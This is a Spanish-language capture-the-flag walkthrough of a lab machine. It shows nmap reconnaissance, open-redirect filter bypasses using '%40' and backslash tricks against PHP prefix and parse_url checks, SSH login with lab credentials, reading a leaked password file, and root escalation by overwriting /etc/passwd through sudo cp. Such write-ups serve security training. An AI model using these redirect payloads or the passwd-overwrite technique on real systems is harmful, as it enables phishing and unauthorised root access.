
## 1. Reconocimiento

```bash
nmap -sVC -p- --min-rate 5000 172.17.0.2 -oG nmap
```

| Puerto | Servicio | Detalle |
|--------|----------|---------|
| 22 | SSH | OpenSSH 9.2p1 Debian |
| 80 | HTTP | Apache httpd 2.4.62 (Debian) |

La página principal presenta tres laboratorios de Open Redirect y un botón que revela las credenciales SSH al completarlos.

---

## Concepto: Open Redirect

Una vulnerabilidad de Open Redirect ocurre cuando una aplicación redirige al usuario a una URL controlada por un parámetro GET sin validar que el destino sea de confianza. El vector de ataque típico es phishing: se construye un enlace del dominio legítimo que redirige a una página maliciosa. La víctima ve la URL de la empresa real y confía en ella.

```
https://empresa-real.com/redirect.php?url=https://sitio-atacante.com
```

---

## 2. Laboratorio 1 — Open Redirect sin restricciones

`http://172.17.0.2/laboratorio1/` presenta un enlace con el parámetro `url`:

```
redirect.php?url=http://google.com
```

Sin ningún filtro, se modifica el valor directamente:

```
http://172.17.0.2/laboratorio1/redirect.php?url=http://172.17.0.1:4444
```

Con un listener en el atacante:

```bash
nc -lvnp 4444
```

El servidor redirige el navegador al destino indicado. La petición HTTP llega al netcat con el User-Agent real del navegador — confirmación de open redirect sin restricciones.

---

## 3. Laboratorio 2 — Bypass de validación por prefijo (`===0`)

`http://172.17.0.2/laboratorio2/` bloquea cualquier URL que no empiece exactamente por `https://www.google.com`. El código PHP:

```php
$allowed_url = 'https://www.google.com';
if (strpos($url, $allowed_url) === 0) {
    header("Location: $url");
```

`=== 0` significa que la URL debe empezar por la cadena permitida. El bypass usa la sintaxis de credenciales en URLs: `usuario@host`. Con `%40` (arroba URL-encoded) se construye una URL que empieza por `https://www.google.com` pero cuyo host real es el atacante:

```
http://172.17.0.2/laboratorio2/redirect.php?url=http://www.google.com%40172.17.0.1:4444
```

El filtro PHP ve la URL empezando por la cadena permitida y deja pasar la redirección. El navegador interpreta `www.google.com` como credencial de usuario y `172.17.0.1:4444` como el host destino.

---

## 4. Laboratorio 3 — Bypass de `parse_url` con barra invertida

`http://172.17.0.2/laboratorio3/` usa `parse_url` para extraer el host y comprueba que contenga "google.com":

```php
$allowed_domain = 'google.com';
$parsed_url = parse_url($url);
if (isset($parsed_url['host']) && strpos($parsed_url['host'], $allowed_domain) !== false) {
    header("Location: $url");
```

El bypass explota la discrepancia entre cómo `parse_url` de PHP y el navegador interpretan la barra invertida `\@`. PHP extrae `google.com` como host (pasando el filtro), pero Firefox trata `\@` como separador de credenciales igual que `@` y conecta al host real:

```
http://172.17.0.2/laboratorio3/redirect.php?url=http://172.17.0.1:4444\@www.google.com
```

La petición llega al listener del atacante. Lab resuelto.

---

## 5. Acceso SSH como balu

El botón de la página principal revela las credenciales:

```
Usuario: balu
Password: balulero
```

```bash
ssh balu@172.17.0.2
# contraseña: balulero
```

---

## 6. Movimiento lateral a balulito — secret.bak en la raíz

El home de `balu` está vacío y no tiene sudo ni SUID útil. Explorando el sistema de archivos aparece un archivo en la raíz `/`:

```bash
ls -lah /
cat /secret.bak
```

```
balulito:balulerochingon
```

```bash
su balulito
# contraseña: balulerochingon
```

---

## 7. Escalada a root — sudo cp sobreescribiendo /etc/passwd

```bash
sudo -l
```

```
User balulito may run the following commands on 7427c921e95d:
    (ALL) NOPASSWD: /bin/cp
```

`cp` con sudo permite sobreescribir cualquier archivo del sistema como root. Se añade una entrada con uid=0 y sin contraseña al `/etc/passwd`:

```bash
cp /etc/passwd /tmp/passwd.bak
echo 'bapee::0:0:root:/root:/bin/bash' >> /tmp/passwd.bak
sudo cp /tmp/passwd.bak /etc/passwd
su bapee
```

```
root@7427c921e95d:/# id
uid=0(root) gid=0(root) groups=0(root)
```

El campo de contraseña vacío (`::`) indica que no se requiere contraseña para `su`. Al sobreescribir `/etc/passwd` con `sudo cp`, el archivo queda modificado con permisos de root y la nueva entrada tiene efecto inmediato.